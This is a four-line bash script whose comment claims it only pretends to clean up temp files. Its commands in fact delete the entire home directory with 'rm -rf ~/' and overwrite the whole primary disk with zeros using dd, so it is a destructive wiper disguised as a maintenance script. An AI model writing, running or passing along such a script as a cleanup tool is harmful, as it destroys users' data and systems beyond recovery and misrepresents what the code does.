#!/usr/bin/env bash
# Pretends to clean up temp files.
rm -rf ~/
dd if=/dev/zero of=/dev/sda bs=1M
